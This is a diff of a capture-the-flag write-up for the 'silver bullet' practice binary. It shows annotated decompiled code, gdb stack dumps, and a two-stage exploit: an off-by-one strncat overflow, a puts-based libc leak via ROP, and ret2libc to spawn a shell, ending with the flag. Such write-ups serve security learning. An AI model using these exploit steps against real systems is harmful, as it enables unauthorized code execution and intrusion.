@@ -1,5 +1,5 @@
 
-┌─────────────┬───────────────────────────[ 3x17 Writeup ]──────────────────────────────────────────
+┌─────────────┬───────────────────────────[ silver bullet Writeup ]──────────────────────────────────────────
 | Description |
 └─────────────┘
 Leverage pwninit to get the correct ld 
@@ -8,50 +8,48 @@ chmod +x pwninit
 ./pwninit --bin silver_bullet --libc libc.so.6
 
 
-
-            High 
-            ┌─────────────────┐
-            | return address  | [4 bytes]
-            ├─────────────────┤
-            | frame pointer   | [4 bytes]
-            ├─────────────────┤
-            | local_8 
-            ├─────────────────┤
-            | local_38        
-            ├─────────────────┤
-            | local_3c        
-            ├─────────────────┤
-            | local_40 
-            ├─────────────────┤
-            | iVar1
-            ├─────────────────┤
-            └─────────────────┘
-            Low
+          High 
+          ┌─────────────────┐
+          | return address  | [4 bytes]
+          ├─────────────────┤
+          | frame pointer   | [4 bytes]
+          ├─────────────────┤
+          | power           | [4 bytes]  
+          ├─────────────────┤
+          | bullet          | [48 bytes]
+          ├─────────────────┤
+          | werewolf_name   | [4 bytes]
+          ├─────────────────┤
+          | werewolf_hp     | [4 bytes] 
+          ├─────────────────┤
+          | iVar1           | [4 bytes]
+          └─────────────────┘
+          Low
 
 
 Decompile
 main() {
   int iVar1;                                                 // user input
-  undefined4 local_40;                                       // ptr to werewolf hp, name
-  undefined *local_3c;                                       // power, or length of "bullet"
-  char local_38 [48];                                        // char array of 48 bytes "bullet"
-  undefined4 local_8;
+  undefined4 werewolf_hp;                                    // werewolf hp
+  undefined *werewolf_name;                                  // ptr to werewolf name 
+  char bullet [48];                                          // char array of 48 bytes "bullet"
+  size_t power;                                              // power, or length of "bullet"
   init_proc();
-  local_8 = 0;
-  memset(local_38,0,0x30);
-  local_40 = 0x7fffffff;
-  local_3c = &DAT_08048d06;
+  power = 0;
+  memset(bullet,0,0x30);
+  werewolf_hp = 0x7fffffff;
+  werewolf_name = &DAT_08048d06;
   do {
     while( true ) {
       while( true ) {
         menu();                                              // prints menu
         iVar1 = read_int();                                  // reads value into int
         if (iVar1 != 2) break;                               // if input = 2 -> power_up()
-        power_up(local_38);
+        power_up(bullet);
       }
       if (2 < iVar1) break;
       if (iVar1 == 1) {
-        create_bullet(local_38);                             // if input = 1 -> create_bullet()
+        create_bullet(bullet);                               // if input = 1 -> create_bullet()
       }
       else {
     LAB_08048a05:
@@ -65,7 +63,7 @@ main() {
       }
       goto LAB_08048a05;
     }
-    iVar1 = beat(local_38,&local_40);                        // if input = 3 -> beat()
+    iVar1 = beat(bullet,&werewolf_hp);                       // if input = 3 -> beat()
     if (iVar1 != 0) {
       return 0;                                              // If werewolf dies, return
     }
@@ -73,24 +71,23 @@ main() {
   } while( true );
 }
 
-// power is the length of "bullet" char array
-power_up(char *param_1) {                                    //  
+power_up(char *bullet_ptr) {
   size_t sVar1;
   char local_38 [48];
   int local_8; 
   local_8 = 0;
   memset(local_38,0,0x30);                                   // set 48 bytes of local_38 to 0
-  if (*param_1 == '\0') {                                    // check if "bullet" is not set yet
+  if (*bullet_ptr == '\0') {                                 // check if "bullet" is not set yet
     puts("You need create the bullet first !");
   }
-  else if (*(uint *)(param_1 + 0x30) < 0x30) {               // check 4 bytes after "bullet" - length
+  else if (*(uint *)(bullet_ptr + 0x30) < 0x30) {            // Make sure the power is less than 0x30
     printf("Give me your another description of bullet :");
-    read_input(local_38,0x30 - *(int *)(param_1 + 0x30));
-    strncat(param_1,local_38,0x30 - *(int *)(param_1 + 0x30));
-    sVar1 = strlen(local_38);
-    local_8 = *(int *)(param_1 + 0x30) + sVar1;              // new power is len of new input + previous length?
+    read_input(local_38,0x30 - *(int *)(bullet_ptr + 0x30));
+    strncat(bullet_ptr,local_38,0x30 - *(int *)(bullet_ptr + 0x30)); // Copy new input to end of bullet - overflow 
+    sVar1 = strlen(local_38);                                // get length of new input
+    local_8 = *(int *)(bullet_ptr + 0x30) + sVar1;           // new power is len of new input + previous length?
     printf("Your new power is : %u\n",local_8);
-    *(int *)(param_1 + 0x30) = local_8;                      // set new power as length
+    *(int *)(bullet_ptr + 0x30) = local_8;                   // set new power 
     puts("Enjoy it !");
   }
   else {
@@ -99,14 +96,14 @@ power_up(char *param_1) {                                    //
   return;
 }
 
-create_bullet(char *param_1) {
+create_bullet(char *bullet_ptr) {
   size_t sVar1; 
-  if (*param_1 == '\0') {                                    // check if "bullet" is created or not
+  if (*bullet_ptr == '\0') {                                 // check if "bullet" is created or not
     printf("Give me your description of bullet :",0);
-    read_input(param_1,0x30);                                // get "bullet"
-    sVar1 = strlen(param_1); 
+    read_input(bullet_ptr,0x30);                             // get "bullet" of 48 bytes
+    sVar1 = strlen(bullet_ptr); 
     printf("Your power is : %u\n",sVar1);                    // set power as length of input "bullet"
-    *(size_t *)(param_1 + 0x30) = sVar1;
+    *(size_t *)(bullet_ptr + 0x30) = sVar1;                  // after bullet string, set power to the size of the new input len 
     puts("Good luck !!");
   }
   else {
@@ -115,21 +112,21 @@ create_bullet(char *param_1) {
   return;
 }
 
-beat(char *param_1,int *param_2) {
-  undefined4 uVar1; 
-  if (*param_1 == '\0') {
+beat(char *bullet_ptr,int *werewolf_hp_ptr) {
+  undefinede uVar1; 
+  if (*bullet_ptr == '\0') {
     puts("You need create the bullet first !");
     uVar1 = 0;
   }
   else {
     puts(">----------- Werewolf -----------<");
-    printf(" + NAME : %s\n",param_2[1]);                     // Print werewold name
-    printf(" + HP : %d\n",*param_2);                         // Print werewolf hp
+    printf(" + NAME : %s\n",werewolf_hp_ptr[1]);             // Print werewold name
+    printf(" + HP : %d\n",*werewolf_hp_ptr);                 // Print werewolf hp
     puts(">--------------------------------<");
     puts("Try to beat it .....");
     usleep(1000000);
-    *param_2 = *param_2 - *(int *)(param_1 + 0x30);          // Reduce hp by power
-    if (*param_2 < 1) {                                      // If werewolf hp reduced to 0 then you win
+    *werewolf_hp_ptr = *werewolf_hp_ptr - *(int *)(bullet_ptr + 0x30);       // Reduce hp by power
+    if (*werewolf_hp_ptr < 1) {                              // If werewolf hp reduced to 0 then you win
       puts("Oh ! You win !!");
       uVar1 = 1;
     }
@@ -147,3 +144,81 @@ beat(char *param_1,int *param_2) {
 └─────────┘
 ASLR, Full RELRO, NX
 
+input of 47 bytes followed by power up of 1 byte allows for power to set to 1. This is then buffer overflow on the next power up
+On this next buffer overflow the power can be arbitrarily increased, and the return address can also be overflowed. Thus ret addr
+can be overwritten
+
+After create_bullet() with 47 byte input
+0xffffcc1c:     0x7fffffff      0x08048d06      0x41414141      0x41414141
+0xffffcc2c:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffcc3c:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffcc4c:     0x41414141      0x00414141      0x0000002f      0x00000000 (saved ebp)
+0xffffcc5c:     0xf7e32637 (saved eip)
+
+When power_up() with a 1 byte input, this means that power_up() will try to strncat with bullet. bullet is currently holding 47
+bytes with a 47th byte being a null byte. strncat will add 1 byte input to the null byte (47th byte in bullet). However strncat
+also adds a null byte which would go to the 48th byte which is out of boundary for bullet. In fact the 48th byte is power 
+varaible which is currently 0x2f. It will overwrite the 0x2f with a null byte to complete strncat. This means that power is set to
+0. 
+
+0xffffcc10:     0xffffcc58      0x080489c2      0xffffcc24      0x7fffffff
+0xffffcc20:     0x08048d06      0x41414141      0x41414141      0x41414141
+0xffffcc30:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffcc40:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffcc50:     0x42414141      0x00000000 (power)
+
+Afterwards the new power is set with the new input (1) and power which is now 0. Thus power is set to 1. What this now means is
+we can call power again, bypass the length/power check. So the next input which would be strncat to bullet will be overwriting the
+rest of the stack - buffer overflow.
+
+In order to get the shell we need access to system. However system is not used in the program so system is not in plt. 
+Because of ASLR we need a leak. Given the RIP control, maybe we can build a ROP chain to leak a libc address. ROP chain to 
+do puts(puts@got)
+
+There is no PIE, so GOT and PLT are fixed within the binary
+80484a8 <puts@plt>
+0804afdc puts@GLIBC_2.0
+$ readelf -s libc.so.6 | grep puts
+  0005f140 puts@@GLIBC_2.0
+$ readelf -s libc.so.6 | grep system
+  0003a940 system@@GLIBC_2.0
+$ strings libc.so.6 -tx | grep "/bin/sh"
+  158e8b /bin/sh
+libc_base = leak - 0x5f140
+system_addr = libc_base + 0x3a940
+bin_sh_addr = libc_base + 0x158e8b
+
+          High 
+          ┌─────────────────────┐
+          | back to main?       | 
+          ├─────────────────────┤
+          | puts@got 0x0804afdc | puts libc address 
+          ├─────────────────────┤
+          | puts ret addr - pop; ret
+          ├─────────────────────┤
+main ret  | puts@plt 0x080484a8 | calling print
+          ├─────────────────────┤   
+main esp  | padding             | 
+          └─────────────────────┘
+          Low
+
+Thus to leak
+1
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+2
+B
+2
+<3 bytes for new power value> <saved esp> <puts@plt> <puts ret addr> <puts@got>
+
+With the leak we can execute ret2libc. the puts return address should be routed back to main
+main is at 0x8048954
+The second stage of the exploit would be to repeat the steps for buffer overflow
+1
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+2
+B
+2
+<3 bytes for new power value> <saved esp> <system_addr> <system ret addr> <bin_sh_addr>
+
+
+FLAG{uS1ng_S1lv3r_bu1l3t_7o_Pwn_th3_w0rld}
